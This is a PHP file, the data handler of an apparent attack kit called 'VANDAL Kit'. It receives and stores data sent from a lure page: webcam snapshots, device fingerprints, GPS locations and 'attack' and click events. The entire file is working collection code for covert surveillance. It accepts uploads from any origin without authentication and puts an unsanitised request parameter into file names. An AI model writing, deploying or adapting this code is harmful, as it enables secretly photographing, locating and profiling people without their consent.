<?php
/**
 * VANDAL Kit - Data Handler
 * Processes incoming data from index.html
 */
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

$type = $_GET['type'] ?? 'unknown';
$raw = file_get_contents('php://input');
$data = json_decode($raw, true);

if (!$data) {
    echo json_encode(['status' => 'error', 'message' => 'Invalid JSON']);
    exit;
}

$timestamp = date('Ymd_His');
$random = bin2hex(random_bytes(3));

switch ($type) {
    case 'webcam':
        if (isset($data['image'])) {
            $img = $data['image'];
            if (strpos($img, ',') !== false) {
                $img = substr($img, strpos($img, ',') + 1);
            }
            $imgFile = "webcam_{$timestamp}_{$random}.jpg";
            $metaFile = "webcam_{$timestamp}_{$random}.json";
            
            file_put_contents($imgFile, base64_decode($img));
            file_put_contents($metaFile, json_encode([
                'timestamp' => $timestamp,
                'userAgent' => $data['userAgent'] ?? 'Unknown',
                'type' => 'webcam'
            ], JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT));
            
            echo json_encode(['status' => 'ok', 'type' => 'webcam', 'file' => $imgFile]);
        } else {
            echo json_encode(['status' => 'error', 'message' => 'No image data']);
        }
        break;
        
    case 'device':
        file_put_contents(
            "device_{$timestamp}_{$random}.json",
            json_encode($data, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT)
        );
        echo json_encode(['status' => 'ok', 'type' => 'device']);
        break;
        
    case 'gps':
        file_put_contents(
            "gps_{$timestamp}_{$random}.json",
            json_encode($data, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT)
        );
        echo json_encode(['status' => 'ok', 'type' => 'gps']);
        break;
        
    case 'attack_start':
    case 'attack_complete':
    case 'click':
        file_put_contents(
            "{$type}_{$timestamp}_{$random}.json",
            json_encode($data, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT)
        );
        echo json_encode(['status' => 'ok', 'type' => $type]);
        break;
        
    default:
        file_put_contents(
            "{$type}_{$timestamp}_{$random}.json",
            json_encode($data, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT)
        );
        echo json_encode(['status' => 'ok', 'type' => $type]);
}